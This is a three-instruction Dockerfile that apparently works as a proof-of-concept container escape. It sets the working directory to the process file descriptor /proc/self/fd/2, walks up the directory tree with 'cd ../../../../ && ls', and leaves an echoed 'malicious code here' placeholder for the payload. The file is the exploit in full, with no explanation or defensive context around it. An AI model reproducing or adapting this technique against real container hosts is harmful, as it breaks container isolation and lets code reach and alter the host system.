FROM ubuntu

WORKDIR /proc/self/fd/2

RUN cd ../../../../ && ls &&  echo "malicious code here"
